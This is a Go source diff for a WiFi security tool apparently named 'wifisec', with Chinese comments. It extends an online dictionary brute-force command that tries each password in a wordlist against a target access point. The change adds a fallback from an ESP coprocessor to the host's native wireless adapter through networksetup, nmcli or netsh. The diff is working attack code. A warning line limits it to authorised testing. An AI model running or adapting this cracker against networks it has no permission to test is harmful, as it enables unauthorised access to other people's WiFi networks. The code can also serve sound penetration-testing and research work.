@@ -4,21 +4,30 @@ import (
 	"bufio"
 	"errors"
 	"fmt"
+	"io"
 	"net"
 	"os"
+	"runtime"
 	"strings"
 	"time"
 
+	platformassoc "github.com/ctkqiang/wifisec/internal/platform/assoc"
 	platformesp "github.com/ctkqiang/wifisec/internal/platform/esp"
 	"github.com/ctkqiang/wifisec/internal/utilities"
 )
 
+// associator 是爆破执行器的最小抽象：ESP 协处理器与各平台本机网卡
+// 都收敛到同一个签名，爆破主循环不感知底层走哪条路径。
+type associator interface {
+	Associate(ssid, password string) (bool, error)
+}
+
 // BruteForceConnectToWiFi 对目标 AP 进行在线密码字典爆破。
 // 用法：wifisec brute <ssid|bssid> with-pass: <字典文件> [串口]
 //
-// 仅支持 ESP 协处理器路径：在线破解的本质是让无线芯片逐个尝试关联 AP，
-// Linux/Windows 原生路径没有「尝试连接」的抽象，且系统级关联会污染
-// 网络配置；ESP 的 WiFi.begin 是最干净的试验场。
+// 执行路径自动选择：插入 ESP 时走协处理器（不碰本机网络配置）；
+// 无设备时回落本机无线网卡（macOS networksetup / Linux nmcli /
+// Windows netsh），代价是爆破期间本机 WiFi 反复断开重连。
 //
 // 在线破解的固有局限（启动时向用户说明）：
 //   - 每次尝试需 2-5 秒（AP 应答失败的时间），大字典耗时长
@@ -42,37 +51,20 @@ func BruteForceConnectToWiFi(args []string) error {
 		return errors.New("字典文件为空，无密码可尝试")
 	}
 
-	if portName == "" {
-		portName, err = platformesp.DefaultPort()
-		if err != nil {
-			return err
-		}
-	}
-
-	utilities.Info("连接 %s，等待固件就绪…", portName)
-	injector, err := platformesp.Open(portName)
+	assocSvc, ssid, closer, err := openAssociator(portName, target, targetMAC)
 	if err != nil {
 		return err
 	}
-	defer injector.Close()
-
-	utilities.Info("协处理器就绪（协议 v%d），扫描周边网络定位目标…", injector.FirmwareVersion())
-	scanned, err := injector.Scan()
-	if err != nil {
-		return fmt.Errorf("扫描失败：%w", err)
+	if closer != nil {
+		defer closer.Close()
 	}
 
-	ssid := resolveTargetSSID(scanned, target, targetMAC)
-	if ssid == "" {
-		return fmt.Errorf("未找到目标 %s，请确认 SSID/BSSID 正确且目标在信号范围内", target)
-	}
 	utilities.Info("目标锁定：SSID %q", ssid)
-
 	utilities.Warn("在线爆破模式：每次尝试约 2-5 秒，AP 可能在多次失败后限速；仅用于授权测试")
 
 	started := time.Now()
 	for idx, pass := range passwords {
-		ok, err := injector.Associate(ssid, pass)
+		ok, err := assocSvc.Associate(ssid, pass)
 		if err != nil {
 			utilities.Warn("[%d/%d] 尝试 %q 出错：%v", idx+1, len(passwords), pass, err)
 			continue
@@ -90,6 +82,50 @@ func BruteForceConnectToWiFi(args []string) error {
 	utilities.Warn("字典遍历完毕，未找到正确密码（共 %d 个候选 · 耗时 %s）",
 		len(passwords), time.Since(started).Round(time.Second))
 	return nil
+}
+
+// openAssociator 选择爆破执行路径。优先 ESP 协处理器：关联尝试跑在
+// 板载射频上，不污染宿主机网络配置；未检测到设备时回落本机网卡。
+// 返回的 closer 仅 ESP 路径非 nil（本机网卡无资源需释放）。
+func openAssociator(portName, target string, targetMAC net.HardwareAddr) (associator, string, io.Closer, error) {
+	if portName == "" {
+		if p, err := platformesp.DefaultPort(); err == nil {
+			portName = p
+		}
+	}
+
+	if portName != "" {
+		utilities.Info("连接 %s，等待固件就绪…", portName)
+		injector, err := platformesp.Open(portName)
+		if err != nil {
+			return nil, "", nil, err
+		}
+		utilities.Info("协处理器就绪（协议 v%d），扫描周边网络定位目标…", injector.FirmwareVersion())
+		scanned, err := injector.Scan()
+		if err != nil {
+			injector.Close()
+			return nil, "", nil, fmt.Errorf("扫描失败：%w", err)
+		}
+		ssid := resolveTargetSSID(scanned, target, targetMAC)
+		if ssid == "" {
+			injector.Close()
+			return nil, "", nil, fmt.Errorf("未找到目标 %s，请确认 SSID/BSSID 正确且目标在信号范围内", target)
+		}
+		return injector, ssid, injector, nil
+	}
+
+	// 本机网卡路径：关联由系统网络栈完成，无法按 BSSID 反查 SSID
+	// （扫描同样依赖 ESP 或定位权限），仅接受 SSID 目标。
+	if targetMAC != nil {
+		return nil, "", nil, errors.New("本机网卡路径仅支持按 SSID 爆破；请改用 SSID，或插入 ESP 协处理器按 BSSID 锁定")
+	}
+	native, err := platformassoc.NewNative()
+	if err != nil {
+		return nil, "", nil, err
+	}
+	utilities.Warn("未检测到 ESP 协处理器，回落到本机无线网卡（%s）", runtime.GOOS)
+	utilities.Warn("爆破期间本机 WiFi 会反复断开重连，当前网络连接将不可用")
+	return native, target, nil, nil
 }
 
 // parseBruteArgs 解析 brute 子命令参数。
